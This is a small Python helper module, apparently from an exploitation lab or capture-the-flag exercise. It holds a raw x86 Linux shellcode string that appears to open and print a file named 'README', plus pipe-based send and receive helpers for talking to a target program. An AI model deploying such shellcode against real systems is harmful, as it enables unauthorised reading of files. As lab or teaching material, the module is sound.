#!/usr/bin/env python3

import argparse
import atexit
import sys

SHELLCODE = \
    '\x31\xc0\x31\xdb\x31\xc9\x31\xd2' \
    '\xeb\x32\x5b\xb0\x05\x31\xc9\xcd' \
    '\x80\x89\xc6\xeb\x06\xb0\x01\x31' \
    '\xdb\xcd\x80\x89\xf3\xb0\x03\x83' \
    '\xec\x01\x8d\x0c\x24\xb2\x01\xcd' \
    '\x80\x31\xdb\x39\xc3\x74\xe6\xb0' \
    '\x04\xb3\x02\xb2\x01\xcd\x80\x83' \
    '\xc4\x01\xeb\xdf\xe8\xc9\xff\xff' \
    '\xffREADME\x00'

input = None
output = None

# The program doesn't start until its input and output are connected, so opening
# the pipes effectively starts the program.
def start():
    global input, output

    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--input')
    parser.add_argument('-o', '--output')
    args = parser.parse_args()
    input = open(args.input, 'w', encoding='latin1') if args.input is not None else sys.stdout
    output = open(args.output, 'r', encoding='latin1') if args.input is not None else sys.stdin

def recv(num_bytes):
    assert output is not None, 'Cannot recv until start is called!'
    return output.read(num_bytes)

def recvline():
    assert output is not None, 'Cannot recv until start is called!'
    return output.readline()

def send(s):
    assert input is not None, 'Cannot send until start is called!'
    input.write(s)
    input.flush()

def _close():
    global input, output
    if input is not None:
        input.close()
        input = None
    if output is not None:
        while output.read(4096) != '':
            pass
        output.close()
        output = None

atexit.register(_close)
